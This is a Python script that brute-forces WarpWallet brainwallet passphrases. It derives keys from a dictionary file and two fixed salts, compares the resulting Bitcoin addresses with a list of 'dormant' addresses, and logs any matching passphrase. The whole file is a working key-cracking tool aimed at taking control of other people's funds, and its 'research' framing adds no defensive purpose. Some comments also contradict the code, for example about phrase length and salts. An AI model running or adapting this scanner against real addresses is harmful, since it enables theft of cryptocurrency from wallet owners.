import hashlib
import scrypt
import ecdsa
import base58
import pandas as pd
import os
import time
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

def warp_derive(passphrase, salt=""):
    # WarpWallet Algorithm:
    # 1. s1 = scrypt(passphrase + \x01, salt + \x02, N=2^18, r=8, p=1)
    # 2. s2 = pbkdf2(passphrase + \x03, salt + \x04, c=2^16, dkLen=32, PRF=HMAC-SHA256)
    # 3. private_key = s1 ^ s2
    
    pass_bytes = passphrase.encode('utf-8')
    salt_bytes = salt.encode('utf-8')
    
    # Scrypt
    s1 = scrypt.hash(pass_bytes + b'\x01', salt_bytes + b'\x02', N=2**18, r=8, p=1, buflen=32)
    
    # PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt_bytes + b'\x04',
        iterations=2**16,
        backend=default_backend()
    )
    s2 = kdf.derive(pass_bytes + b'\x03')
    
    # XOR
    priv_bytes = bytes(a ^ b for a, b in zip(s1, s2))
    return priv_bytes

def priv_to_address(priv_bytes):
    sk = ecdsa.SigningKey.from_string(priv_bytes, curve=ecdsa.SECP256k1)
    vk = sk.get_verifying_key()
    public_key_bytes = b'\x04' + vk.to_string()
    sha256_pub = hashlib.sha256(public_key_bytes).digest()
    ripemd160 = hashlib.new('ripemd160', sha256_pub).digest()
    prefixed_pub = b'\x00' + ripemd160
    checksum = hashlib.sha256(hashlib.sha256(prefixed_pub).digest()).digest()[:4]
    address = base58.b58encode(prefixed_pub + checksum).decode('utf-8')
    return address

def run_warp_scanner():
    if not os.path.exists("dormant_addresses.csv"):
        print("Missing dormant_addresses.csv")
        return

    df = pd.read_csv("dormant_addresses.csv")
    target_addresses = set(df['Address'].tolist())
    
    dict_file = "extended_dictionary.txt"
    if not os.path.exists(dict_file):
        base_phrases = ["satoshi nakamoto"]
    else:
        with open(dict_file, "r") as f:
            base_phrases = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(f"Running WarpWallet scan (intensive) on {len(base_phrases)} phrases against {len(target_addresses)} addresses...")
    
    # In research, we might assume empty salt or email as salt
    # WarpWallet usually requires a salt (like an email). 
    # For now, we test empty salt and the phrase itself as a salt.
    salts = ["", "satoshi@bitcoin.org"] 
    
    found = False
    for phrase in base_phrases:
        for salt in salts:
            try:
                # WarpWallet is SLOW by design. We limit the number of phrases for this demo.
                # Only check phrases with more than 10 characters to save time on useless words
                if len(phrase) < 5: continue
                
                priv_bytes = warp_derive(phrase, salt)
                address = priv_to_address(priv_bytes)
                
                if address in target_addresses:
                    print(f"\n!!! WARPWALLET MATCH FOUND !!!")
                    print(f"Phrase: {phrase} | Salt: {salt}")
                    print(f"Address: {address}")
                    with open("vulnerabilities_found.txt", "a") as vf:
                        vf.write(f"WarpWallet Found!\nPhrase: {phrase}\nSalt: {salt}\nAddress: {address}\n\n")
                    found = True
            except Exception as e:
                print(f"Error deriving {phrase}: {e}")
                
    if not found:
        print("No WarpWallet matches found.")

if __name__ == "__main__":
    run_warp_scanner()
